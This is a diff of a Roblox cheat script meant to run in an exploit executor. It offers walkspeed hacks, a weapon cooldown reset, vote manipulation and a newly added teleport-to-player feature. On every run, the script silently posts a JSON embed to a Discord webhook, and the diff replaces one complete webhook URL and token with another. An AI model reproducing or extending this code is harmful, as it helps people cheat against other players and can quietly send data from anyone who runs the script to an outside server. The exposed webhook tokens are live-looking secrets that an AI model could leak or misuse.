@@ -1,7 +1,8 @@
 --Webhook
 getgenv().Webhook = true
 if getgenv().Webhook == true then
-local url = "https://discord.com/api/webhooks/1094806027981041785/ftbYyyDgjyduYz-GxbhMX4Y0m9Kt-Qjm9QLAt8Kyo71ERrkL0zSK9p7iCdyLzSwly965"
+local webhookUrl = "https://discord.com/api/webhooks/1096095999212146809/3QRZ0hBfEl-eUNEdh_hsseu11R2Q-Gm9du_RSY1VGO7fstIQC_xxr9fo0HIMCg_yRscc"
+
 local data = {
    ["content"] = "",
    ["embeds"] = {
@@ -27,8 +28,8 @@ local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+local requestInfo = {Url = webhookUrl, Body = newdata, Method = "POST", Headers = headers}
+request(requestInfo)
 end
 
 
@@ -57,7 +58,8 @@ getgenv().SelectBodyPart = false
 getgenv().Walkspeed = false
 getgenv().NoSlowdown = false
 getgenv().SetWalkspeed = false
-
+getgenv().SelectPlayer = false
+getgenv().viewPlayer = false
 --                                     /{Variables}/\
 local RunService = game:GetService("RunService")
 --                                      /{Tables}/
@@ -67,7 +69,6 @@ for _, child in ipairs(game.Players.LocalPlayer.ItemOwned:GetDescendants()) do
         table.insert(WeaponsNameV2, child.Name)
     end
 end
-
 
 
 local Vote = {}
@@ -389,7 +390,7 @@ local Section = Tab:AddSection({
 })
 local SelectedWeapon = Tab:AddDropdown({
 	Name = "Select weapon", -- The name of the dropdown.
-	Default = WeaponsNameV2[1], -- The default value of the dropdown.
+	Default = " ", -- The default value of the dropdown.
 	Options = WeaponsNameV2, -- The options in the dropdown.
 	Callback = function(Value) -- The function of the dropdown.
 		getgenv().SelectWeapon = Value
@@ -422,7 +423,7 @@ local Section = Tab:AddSection({
 })
 Tab:AddDropdown({
 	Name = "Select Mode", -- The name of the dropdown.
-	Default = Vote[1], -- The default value of the dropdown.
+	Default = " ", -- The default value of the dropdown.
 	Options = Vote, -- The options in the dropdown.
 	Callback = function(Value) -- The function of the dropdown.
 		getgenv().UnfairVote = Value
@@ -478,6 +479,76 @@ Tab:AddButton({
       game.Players.LocalPlayer.Backpack.EpicKatana.Cooldown.Value = 0
   	end    
 })
+local Section = Tab:AddSection({
+	Name = "Teleport to Player Section" -- The name of the section.
+})
+-- Get a reference to the client player
+local player = game.Players.LocalPlayer
+
+-- Define the options table
+local options = {}
+
+-- Define the SelectPlayer dropdown
+local SelectPlayer = Tab:AddDropdown({
+    Name = "Select Player",
+    Default = "",
+    Options = options,
+    Callback = function(Value)
+        getgenv().SelectedPlayer = Value
+    end
+})
+
+-- Define a function to repopulate the options table
+local function repopulateOptions()
+    local newOptions = {}
+    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            table.insert(newOptions, otherPlayer.Name)
+        end
+    end
+    options = newOptions
+    SelectPlayer:Refresh(options, true)
+    getgenv().SelectedPlayer = ""
+end
+-- Call the repopulateOptions function to populate the options table
+repopulateOptions()
+
+-- Define the Teleport button
+local teleportButton = Tab:AddButton({
+    Name = "Teleport To selected Player",
+    Callback = function()
+        local selectedPlayer = game.Players:FindFirstChild(getgenv().SelectedPlayer)
+        if selectedPlayer ~= nil and selectedPlayer.Character ~= nil and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local rootPart = selectedPlayer.Character:WaitForChild("HumanoidRootPart")
+            game.Players.LocalPlayer.Character:MoveTo(rootPart.Position)
+        end
+    end
+})
+
+-- Define the Refresh button
+local refreshButton = Tab:AddButton({
+    Name = "Refresh Select Player Dropdown",
+    Callback = function()
+        repopulateOptions()
+        getgenv().SelectedPlayer = ""
+    end
+})
+
+-- Call the Refresh() method to set the dropdown options
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 --                                        { Tabs 2 }
 local Section = Tab1:AddSection({
 	Name = "Walkspeed Section" -- The name of the section.
